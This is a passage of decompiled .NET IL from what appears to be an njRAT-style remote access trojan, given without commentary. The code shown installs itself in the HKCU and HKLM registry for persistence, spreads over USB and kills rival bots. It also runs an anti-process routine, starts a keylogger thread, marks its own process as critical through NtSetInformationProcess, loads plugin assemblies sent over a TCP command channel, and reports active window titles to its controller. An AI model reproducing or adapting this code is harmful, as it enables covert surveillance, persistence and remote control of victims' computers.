      IL_03f0:  leave.s    IL_03f2

    }  // end handler
    IL_03f2:  ret
  } // end of method OK::INS

  .method public static void  ko() cil managed noinlining nooptimization
  {
    // Code size       979 (0x3d3)
    .maxstack  5
    .locals init (bool V_0,
             int32 V_1,
             string V_2,
             class [mscorlib]System.Exception V_3,
             class [mscorlib]System.Exception V_4,
             class [mscorlib]System.Exception V_5,
             class [mscorlib]System.Exception V_6,
             string V_7,
             class [mscorlib]System.Exception V_8,
             class [mscorlib]System.Exception V_9,
             class [mscorlib]System.Exception V_10)
    IL_0000:  ldsfld     string j.OK::SLP
    IL_0005:  call       float64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToDouble(string)
    IL_000a:  ldc.r8     1000.
    IL_0013:  mul
    IL_0014:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_0019:  call       float64 [mscorlib]System.Math::Round(float64)
    IL_001e:  conv.ovf.i4
    IL_001f:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_0024:  ldsfld     bool j.OK::Anti_CH
    IL_0029:  brfalse.s  IL_003e

    .try
    {
      IL_002b:  call       void MyAntiProcess::Start()
      IL_0030:  leave.s    IL_003e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0032:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0037:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003c:  leave.s    IL_003e

    }  // end handler
    IL_003e:  ldsfld     bool j.OK::BOT_KILL
    IL_0043:  brfalse.s  IL_005f

    .try
    {
      IL_0045:  call       void BotKillers::RunStandardBotKiller()
      IL_004a:  ldc.i4.s   50
      IL_004c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0051:  leave.s    IL_005f

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0053:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0058:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_005d:  leave.s    IL_005f

    }  // end handler
    IL_005f:  ldsfld     bool j.OK::USB_SP
    IL_0064:  brfalse.s  IL_0079

    .try
    {
      IL_0066:  call       void spredusb::Start()
      IL_006b:  leave.s    IL_0079

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_006d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0072:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0077:  leave.s    IL_0079

    }  // end handler
    IL_0079:  ldsfld     bool j.OK::Persis
    IL_007e:  brfalse.s  IL_0093

    .try
    {
      IL_0080:  call       void Persistence::Startup()
      IL_0085:  leave.s    IL_0093

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0087:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_008c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0091:  leave.s    IL_0093

    }  // end handler
    IL_0093:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::Command()
    IL_0098:  brfalse.s  IL_00dd

    .try
    {
      IL_009a:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_009f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_00a4:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_00a9:  ldstr      "di"
      IL_00ae:  ldstr      "!"
      IL_00b3:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object)
      IL_00b8:  leave.s    IL_00d3

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00ba:  dup
      IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c0:  stloc.3
      IL_00c1:  ldloc.3
      IL_00c2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00cc:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d1:  leave.s    IL_00d3

    }  // end handler
    IL_00d3:  ldc.i4     0x1388
    IL_00d8:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_00dd:  ldc.i4.0
    IL_00de:  stloc.0
    IL_00df:  ldc.i4.1
    IL_00e0:  ldsfld     string j.OK::RG
    IL_00e5:  ldloca.s   V_0
    IL_00e7:  newobj     instance void [mscorlib]System.Threading.Mutex::.ctor(bool,
                                                                               string,
                                                                               bool&)
    IL_00ec:  stsfld     object j.OK::MT
    IL_00f1:  ldloc.0
    IL_00f2:  brtrue.s   IL_00f9

    IL_00f4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
    IL_00f9:  call       void j.OK::INS()
    IL_00fe:  ldsfld     bool j.OK::Idr
    IL_0103:  brtrue.s   IL_0128

    IL_0105:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_010a:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
    IL_010f:  stsfld     string j.OK::EXE
    IL_0114:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
    IL_0119:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.FileInfo::get_Directory()
    IL_011e:  callvirt   instance string [mscorlib]System.IO.DirectoryInfo::get_Name()
    IL_0123:  stsfld     string j.OK::DR
    IL_0128:  ldnull
    IL_0129:  ldftn      void j.OK::RC()
    IL_012f:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                     native int)
    IL_0134:  ldc.i4.1
    IL_0135:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                int32)
    IL_013a:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
    .try
    {
      IL_013f:  newobj     instance void j.kl::.ctor()
      IL_0144:  stsfld     class j.kl j.OK::kq
      IL_0149:  ldsfld     class j.kl j.OK::kq
      IL_014e:  ldftn      instance void j.kl::WRK()
      IL_0154:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0159:  ldc.i4.1
      IL_015a:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart,
                                                                                  int32)
      IL_015f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0164:  leave.s    IL_0181

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0166:  dup
      IL_0167:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_016c:  stloc.s    V_4
      IL_016e:  ldloc.s    V_4
      IL_0170:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0175:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_017f:  leave.s    IL_0181

    }  // end handler
    IL_0181:  ldc.i4.0
    IL_0182:  stloc.1
    IL_0183:  ldstr      ""
    IL_0188:  stloc.2
    IL_0189:  ldsfld     bool j.OK::BD
    IL_018e:  brfalse.s  IL_01c4

    .try
    {
      IL_0190:  ldnull
      IL_0191:  ldftn      void j.OK::_Lambda__2(object,
                                                 class [System]Microsoft.Win32.SessionEndingEventArgs)
      IL_0197:  newobj     instance void [System]Microsoft.Win32.SessionEndingEventHandler::.ctor(object,
                                                                                                  native int)
      IL_019c:  call       void [System]Microsoft.Win32.SystemEvents::add_SessionEnding(class [System]Microsoft.Win32.SessionEndingEventHandler)
      IL_01a1:  ldc.i4.1
      IL_01a2:  call       void j.OK::pr(int32)
      IL_01a7:  leave.s    IL_01c4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01a9:  dup
      IL_01aa:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01af:  stloc.s    V_5
      IL_01b1:  ldloc.s    V_5
      IL_01b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01bd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01c2:  leave.s    IL_01c4

    }  // end handler
    IL_01c4:  ldc.i4     0x3e8
    IL_01c9:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
    IL_01ce:  ldsfld     bool j.OK::Cn
    IL_01d3:  brtrue.s   IL_01db

    IL_01d5:  ldstr      ""
    IL_01da:  stloc.2
    IL_01db:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
    .try
    {
      IL_01e0:  ldloc.1
      IL_01e1:  ldc.i4.1
      IL_01e2:  add.ovf
      IL_01e3:  stloc.1
      IL_01e4:  ldloc.1
      IL_01e5:  ldc.i4.5
      IL_01e6:  bne.un.s   IL_0219

      .try
      {
        IL_01e8:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_01ed:  ldc.i4     0x400
        IL_01f2:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
        IL_01f7:  callvirt   instance void [System]System.Diagnostics.Process::set_MinWorkingSet(native int)
        IL_01fc:  leave.s    IL_0219

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_01fe:  dup
        IL_01ff:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0204:  stloc.s    V_6
        IL_0206:  ldloc.s    V_6
        IL_0208:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_020d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0212:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0217:  leave.s    IL_0219

      }  // end handler
      IL_0219:  ldloc.1
      IL_021a:  ldc.i4.8
      IL_021b:  blt.s      IL_024b

      IL_021d:  ldc.i4.0
      IL_021e:  stloc.1
      IL_021f:  call       string j.OK::ACT()
      IL_0224:  stloc.s    V_7
      IL_0226:  ldloc.2
      IL_0227:  ldloc.s    V_7
      IL_0229:  ldc.i4.0
      IL_022a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_022f:  brfalse.s  IL_024b

      IL_0231:  ldloc.s    V_7
      IL_0233:  stloc.2
      IL_0234:  ldstr      "act"
      IL_0239:  ldsfld     string j.OK::Y
      IL_023e:  ldloc.s    V_7
      IL_0240:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0245:  call       bool j.OK::Send(string)
      IL_024a:  pop
      IL_024b:  ldsfld     bool j.OK::Isu
      IL_0250:  brfalse    IL_03b0

      .try
      {
        IL_0255:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_025a:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_025f:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_0264:  ldsfld     string j.OK::sf
        IL_0269:  ldstr      "\\"
        IL_026e:  ldsfld     string j.OK::RG
        IL_0273:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0278:  ldstr      ""
        IL_027d:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0282:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0287:  ldstr      "\""
        IL_028c:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0291:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0296:  ldstr      "\" .."
        IL_029b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02a0:  ldc.i4.0
        IL_02a1:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_02a6:  brfalse.s  IL_02e5

        IL_02a8:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_02ad:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02b2:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
        IL_02b7:  ldsfld     string j.OK::sf
        IL_02bc:  ldc.i4.1
        IL_02bd:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_02c2:  ldsfld     string j.OK::RG
        IL_02c7:  ldstr      "\""
        IL_02cc:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_02d1:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_02d6:  ldstr      "\" .."
        IL_02db:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_02e0:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_02e5:  leave.s    IL_0302

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_02e7:  dup
        IL_02e8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02ed:  stloc.s    V_8
        IL_02ef:  ldloc.s    V_8
        IL_02f1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02fb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0300:  leave.s    IL_0302

      }  // end handler
      IL_0302:  nop
      .try
      {
        IL_0303:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_0308:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_030d:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0312:  ldsfld     string j.OK::sf
        IL_0317:  ldstr      "\\"
        IL_031c:  ldsfld     string j.OK::RG
        IL_0321:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0326:  ldstr      ""
        IL_032b:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0330:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0335:  ldstr      "\""
        IL_033a:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_033f:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0344:  ldstr      "\" .."
        IL_0349:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_034e:  ldc.i4.0
        IL_034f:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0354:  brfalse.s  IL_0393

        IL_0356:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_035b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0360:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0365:  ldsfld     string j.OK::sf
        IL_036a:  ldc.i4.1
        IL_036b:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0370:  ldsfld     string j.OK::RG
        IL_0375:  ldstr      "\""
        IL_037a:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_037f:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0384:  ldstr      "\" .."
        IL_0389:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_038e:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0393:  leave.s    IL_03b0

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0395:  dup
        IL_0396:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_039b:  stloc.s    V_9
        IL_039d:  ldloc.s    V_9
        IL_039f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_03a4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03a9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_03ae:  leave.s    IL_03b0

      }  // end handler
      IL_03b0:  leave      IL_01c4

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03b5:  dup
      IL_03b6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03bb:  stloc.s    V_10
      IL_03bd:  ldloc.s    V_10
      IL_03bf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03c4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03c9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03ce:  leave      IL_01c4
    }  // end handler
  } // end of method OK::ko

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       60 (0x3c)
    .maxstack  3
    .locals init (string V_0,
             uint8 V_1,
             uint8[] V_2,
             int32 V_3)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  ldarg.0
    IL_0006:  call       instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000b:  starg.s    B
    IL_000d:  ldstr      ""
    IL_0012:  stloc.0
    IL_0013:  ldarg.0
    IL_0014:  stloc.2
    IL_0015:  ldc.i4.0
    IL_0016:  stloc.3
    IL_0017:  br.s       IL_0034

    IL_0019:  ldloc.2
    IL_001a:  ldloc.3
    IL_001b:  ldelem.u1
    IL_001c:  stloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldloca.s   V_1
    IL_0020:  ldstr      "x2"
    IL_0025:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_002f:  stloc.0
    IL_0030:  ldloc.3
    IL_0031:  ldc.i4.1
    IL_0032:  add.ovf
    IL_0033:  stloc.3
    IL_0034:  ldloc.3
    IL_0035:  ldloc.2
    IL_0036:  ldlen
    IL_0037:  conv.i4
    IL_0038:  blt.s      IL_0019

    IL_003a:  ldloc.0
    IL_003b:  ret
  } // end of method OK::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       114 (0x72)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Reflection.Module V_1,
             class [mscorlib]System.Reflection.Module[] V_2,
             int32 V_3,
             class [mscorlib]System.Type V_4,
             class [mscorlib]System.Type[] V_5,
             int32 V_6)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.2
    IL_000c:  ldc.i4.0
    IL_000d:  stloc.3
    IL_000e:  br.s       IL_0068

    IL_0010:  ldloc.2
    IL_0011:  ldloc.3
    IL_0012:  ldelem.ref
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001a:  stloc.s    V_5
    IL_001c:  ldc.i4.0
    IL_001d:  stloc.s    V_6
    IL_001f:  br.s       IL_005c

    IL_0021:  ldloc.s    V_5
    IL_0023:  ldloc.s    V_6
    IL_0025:  ldelem.ref
    IL_0026:  stloc.s    V_4
    IL_0028:  ldloc.s    V_4
    IL_002a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_002f:  ldstr      "."
    IL_0034:  ldarg.1
    IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_003f:  brfalse.s  IL_0056

    IL_0041:  ldloc.1
    IL_0042:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0047:  ldloc.s    V_4
    IL_0049:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_004e:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0053:  stloc.0
    IL_0054:  br.s       IL_0070

    IL_0056:  ldloc.s    V_6
    IL_0058:  ldc.i4.1
    IL_0059:  add.ovf
    IL_005a:  stloc.s    V_6
    IL_005c:  ldloc.s    V_6
    IL_005e:  ldloc.s    V_5
    IL_0060:  ldlen
    IL_0061:  conv.i4
    IL_0062:  blt.s      IL_0021

    IL_0064:  ldloc.3
    IL_0065:  ldc.i4.1
    IL_0066:  add.ovf
    IL_0067:  stloc.3
    IL_0068:  ldloc.3
    IL_0069:  ldloc.2
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0010

    IL_006e:  ldnull
    IL_006f:  stloc.0
    IL_0070:  ldloc.0
    IL_0071:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       49 (0x31)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0005:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000a:  ldc.i4.s   29
      IL_000c:  ldarga.s   i
      IL_000e:  ldc.i4.4
      IL_000f:  call       int32 j.OK::NtSetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0014:  pop
      IL_0015:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0017:  dup
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001d:  stloc.0
      IL_001e:  ldloc.0
      IL_001f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       565 (0x235)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int64 V_2,
             int32 V_3,
             string V_4,
             int32 V_5,
             char V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldstr      ""
    IL_0005:  stsfld     string j.OK::lastcap
    IL_000a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_000f:  brfalse    IL_01d2

    IL_0014:  ldc.i4.m1
    IL_0015:  conv.i8
    IL_0016:  stloc.0
    IL_0017:  ldc.i4.0
    IL_0018:  stloc.1
    .try
    {
      IL_0019:  ldloc.1
      IL_001a:  ldc.i4.1
      IL_001b:  add.ovf
      IL_001c:  stloc.1
      IL_001d:  ldloc.1
      IL_001e:  ldc.i4.s   10
      IL_0020:  bne.un.s   IL_002a

      IL_0022:  ldc.i4.0
      IL_0023:  stloc.1
      IL_0024:  ldc.i4.1
      IL_0025:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_002a:  ldsfld     bool j.OK::Cn
      IL_002f:  brtrue.s   IL_0036

      IL_0031:  leave      IL_01d2

      IL_0036:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_003b:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0040:  ldc.i4.1
      IL_0041:  bge.s      IL_0055

      IL_0043:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0048:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_004d:  ldc.i4.m1
      IL_004e:  ldc.i4.0
      IL_004f:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0054:  pop
      IL_0055:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_005a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_005f:  ldc.i4.0
      IL_0060:  ble        IL_01b5

      IL_0065:  ldloc.0
      IL_0066:  ldc.i4.m1
      IL_0067:  conv.i8
      IL_0068:  bne.un.s   IL_00e9

      IL_006a:  ldstr      ""
      IL_006f:  stloc.s    V_4
      IL_0071:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0076:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_007b:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_0080:  stloc.s    V_5
      IL_0082:  ldloc.s    V_5
      IL_0084:  ldc.i4.m1
      IL_0085:  beq.s      IL_008d

      IL_0087:  ldloc.s    V_5
      IL_0089:  brfalse.s  IL_0092

      IL_008b:  br.s       IL_00c4

      IL_008d:  leave      IL_01d2

      IL_0092:  ldloc.s    V_4
      IL_0094:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_0099:  stloc.0
      IL_009a:  ldstr      ""
      IL_009f:  stloc.s    V_4
      IL_00a1:  ldloc.0
      IL_00a2:  brtrue.s   IL_00b2

      IL_00a4:  ldstr      ""
      IL_00a9:  call       bool j.OK::Send(string)
      IL_00ae:  pop
      IL_00af:  ldc.i4.m1
      IL_00b0:  conv.i8
      IL_00b1:  stloc.0
      IL_00b2:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00b7:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00bc:  ldc.i4.0
      IL_00bd:  bgt.s      IL_0055

      IL_00bf:  br         IL_0019

      IL_00c4:  ldloc.s    V_4
      IL_00c6:  ldloc.s    V_5
